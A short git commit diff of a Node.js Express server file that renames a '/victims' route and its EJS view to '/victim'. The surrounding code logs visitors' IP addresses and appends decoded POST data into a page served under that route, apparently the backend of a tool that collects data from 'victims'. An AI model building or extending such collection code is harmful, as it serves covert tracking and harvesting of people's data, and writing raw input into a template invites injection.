80cfe290796ceb0c32356aef88c93c7e6a0aa42a
Teamdown16 <115584188+Teamdown16@users.noreply.github.com>
2022-10-12 09:40:30 +0600

    Update index.js

--- index.js
+++ index.js
@@ -20,9 +20,9 @@ fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (e
 if (err) throw err;
 });
 });
-app.get("/victims",(req,res)=>{res.render("victims");});
+app.get("/victim",(req,res)=>{res.render("victim");});
 app.post("/",(req,res)=>{
-fs.appendFile('./views/victims.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
+fs.appendFile('./views/victim.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
 if (err) throw err;
 console.log('Saved!');
 res.send("Done");
